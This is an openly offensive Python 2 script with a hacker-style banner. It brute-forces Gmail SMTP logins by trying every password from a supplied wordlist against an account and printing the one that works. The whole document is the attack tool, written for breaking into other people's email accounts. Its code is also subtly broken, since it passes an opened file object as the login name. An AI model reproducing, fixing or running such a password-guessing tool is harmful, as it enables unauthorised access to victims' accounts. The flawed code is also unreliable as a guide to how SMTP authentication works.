#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Auth DavidOfficiel
#
#Social ~
#https://www.youtube.com/channel/UCCYfja7u6YFrpoXzfvgS5Kw ~ youtube
#https://github.com/DavidOfficiel ~ Github
#
#Contact ~ irc.theunderground.pw

import smtplib
import os 
import sys
import time

modules = '1'
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

os.system('clear')
print """\033[1;32m
             \|/
            .-*-         
           / /|\         
          _L_            
        ,"   ".        ~ Im Coming!  
    (\ /  O O  \ /)      
     \|    _    |/       ~ Your Emails are invaded
       \  (_)  /         
       _/.___,\_        ~ Natrual Flooding 
      (_/     \_) 
        \033[1;m"""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" 
print ""
print ""
time.sleep(3)

user = raw_input("\033[1;32memail@list ~# \033[1;m")
user = open(user, "r")
passfile = raw_input("\033[1;32mpass@list ~# \033[1;m")
passfile = open(passfile, "r")

for password in passfile:
	try:
		smtpserver.login(user, password)

		print "[\033[1;91m587\033[97;m] [\033[1;91mstmp\033[97;m] login:\033[1;32m", user,"\033[1;m password:\033[1;32m %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[\033[1;91mATTEMPT\033[97;m] login:", user," - pass: %s" % password

